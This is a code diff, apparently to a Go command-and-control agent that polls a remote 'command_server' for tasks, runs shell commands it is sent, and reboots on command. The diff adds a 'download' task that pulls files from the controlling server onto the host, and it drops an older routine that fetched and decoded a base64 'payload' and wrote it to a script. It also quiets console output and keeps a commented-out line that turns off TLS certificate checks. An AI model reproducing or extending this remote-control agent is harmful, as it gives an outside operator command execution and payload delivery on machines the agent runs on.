@@ -6,10 +6,11 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"time"
 
 	// "io/ioutil"
-	b64 "encoding/base64"
+
 	"log"
 	"net/http"
 	"os"
@@ -163,7 +164,7 @@ func checkIn() {
 
 	// Bit of UI for you
 	if res.StatusCode == 200 {
-		fmt.Println("Response was OK")
+		// fmt.Println("Response was OK")
 	} else {
 		fmt.Println("Response was Not OK")
 	}
@@ -175,15 +176,15 @@ func checkIn() {
 		panic(derr)
 	}
 
+	// Handeling it if there is no new task
+	if post.TaskID == "0" {
+		// fmt.Println("No new task")
+		return
+	}
+
 	fmt.Println("Details of response")
 	fmt.Println("Task: " + post.Task)
 	fmt.Println("Arg: " + post.Arg)
-
-	// Handeling it if there is no new task
-	if post.TaskID == "0" {
-		fmt.Println("No new task")
-		return
-	}
 
 	// This is is where the tasks that the node should then do need to go
 	switch post.Task {
@@ -195,6 +196,8 @@ func checkIn() {
 		reboot(post.TaskID)
 	case "run command":
 		go handle_runCommand(post.TaskID, post.Arg)
+	case "download":
+		go handle_download(post.TaskID, post.Arg)
 	default:
 		// Well if it doesn't match 🤷‍♀️
 
@@ -285,58 +288,82 @@ func reboot(task_id string) error {
 
 }
 
-func getFIle() {
+func handle_download(this_taskID string, args string) {
 
-	fmt.Println("\nStarting the getting file thing")
+	parts := strings.Split(args, " || ")
+	if len(parts) != 2 {
 
-	data := map[string]string{"ID": NodeID}
+		response := Task_Response{this_taskID, "Failed", "unable to parse arguments"}
+		send_response(response)
+		// return errors.New("cant parse download argument")
+	}
 
-	json_data, err := json.Marshal(data)
+	filename := parts[0]
+	destination := parts[1]
+
+	fmt.Println("Filename: " + filename)
+	fmt.Println("Destination: " + destination)
+
+	// Update the server on progress
+	response := Task_Response{this_taskID, "Progress", "Filename: " + filename}
+	send_response(response)
+
+	// Download the file
+	err := downloadFile(filename, "Downloads/"+filename, this_taskID)
 	if err != nil {
-		log.Fatal(err)
+		fmt.Println("Error downloading file:", err)
+		return
 	}
 
-	r, err := http.NewRequest("POST", command_server+"/old-payload", bytes.NewBuffer(json_data))
+}
+
+func downloadFile(filename string, filepath string, this_taskID string) error {
+
+	// // This allows us to use a self signed certificate.
+	// http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+
+	// Create the file
+	out, err := os.Create(filepath)
 	if err != nil {
-		panic(err)
+		return err
 	}
+	defer out.Close()
 
-	// Add the header to say that it's json
-	r.Header.Add("Content-Type", "application/json")
-
-	//Create a client to send the data and then send it
-	client := &http.Client{}
-	res, err := client.Do(r)
+	// Make the request
+	resp, err := http.Get(command_server + "/download/" + filename)
 	if err != nil {
-		panic(err)
+		return err
+	}
+	defer resp.Body.Close()
+
+	// Check the status code
+	if resp.StatusCode != http.StatusOK {
+		os.Remove(filepath) // if the file isn't found. remove the empty destination
+		return fmt.Errorf("failed to download file: %s", resp.Status)
 	}
 
-	//shrug
-	defer res.Body.Close()
+	// Write the body to file in chunks
+	buf := make([]byte, 1024*1024) // 1MB buffer
+	for {
+		n, err := resp.Body.Read(buf)
+		if err != nil && err != io.EOF {
+			return err
+		}
+		if n == 0 {
+			break
+		}
 
-	fmt.Println(res.StatusCode)
-
-	// Parse the JSON response
-	post := &command{}
-
-	fmt.Println(1)
-	derr := json.NewDecoder(res.Body).Decode(post)
-	if derr != nil {
-		panic(derr)
+		_, err = out.Write(buf[:n])
+		if err != nil {
+			return err
+		}
 	}
 
-	// Decoding the body so it's readable
-	details, _ := b64.StdEncoding.DecodeString(post.Details)
-	fmt.Println(string(details))
+	// Update the server on progress
+	response := Task_Response{this_taskID, "Success!", "Filename: " + filename}
+	send_response(response)
 
-	// Output the JSON response
-	fmt.Println("ID: ", post.ID)
-	fmt.Println("Command: ", post.Command)
-	fmt.Println("Details: ", string(details))
-
-	// Write the string to file
-	script_to_file(string(details))
-
+	return nil
 }
 
 // Runs a command based of a task. Then creates a response.
